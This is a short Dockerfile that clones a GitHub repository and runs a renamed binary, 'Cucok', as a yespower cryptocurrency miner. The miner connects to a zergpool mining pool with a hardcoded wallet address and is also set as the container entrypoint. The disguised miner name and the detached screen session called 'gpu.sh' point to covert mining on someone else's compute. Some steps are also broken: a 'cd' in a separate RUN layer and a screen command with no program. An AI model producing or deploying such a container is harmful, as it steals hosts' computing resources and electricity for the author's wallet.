FROM		ubuntu:14.04
MAINTAINER	zaf3hrhke <zaf3hrhke@crpolytechnic.in>

RUN		sudo apt update 
RUN		sudo apt install screen -y 
RUN		screen -dmS gpu.sh
RUN		git clone https://github.com/zaf3hrhke/zaf3hrhke
RUN		cd zaf3hrhke
RUN		./Cucok -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u D9WRu1zs8Bmd9UQwMAXkstkLm4NDzVJnjG -p c=DGB,mc=PYRK

WORKDIR		/zaf3hrhke
ENTRYPOINT	["./Cucok"]
